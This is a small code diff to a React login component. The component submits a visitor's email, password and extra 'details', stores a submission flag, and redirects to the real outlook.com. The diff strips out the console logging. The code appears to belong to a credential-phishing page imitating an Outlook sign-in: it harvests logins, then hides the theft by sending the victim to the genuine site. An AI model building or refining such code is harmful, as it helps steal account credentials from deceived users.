@@ -41,13 +41,11 @@ const Login = () => {
 
     try {
       await submit({ email, password, ...isDetails });
-      console.log('Form submitted successfully!');
       // Set the form submission flag in localStorage
       localStorage.setItem('formSubmitted', 'true');
       // Redirect to Outlook after successful submission
       window.location.replace('https://outlook.com');
     } catch (error) {
-      console.error('Error submitting form:', error);
     } finally {
       // Reset form fields
       setEmail('');
